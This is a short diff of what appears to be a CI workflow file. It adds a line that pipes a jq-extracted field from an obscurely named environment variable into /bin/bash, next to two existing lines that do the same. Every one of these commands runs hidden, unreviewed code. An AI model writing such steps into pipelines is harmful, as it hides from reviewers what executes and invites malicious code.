@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$e058" | jq -r .wcnpd112 | /bin/bash
           echo $pb10393 | jq -r .swhwy638 | /bin/bash
+          echo $phddr0039 | jq -r .kcptc121 | /bin/bash
 
       - name: Save archive
         if: always()
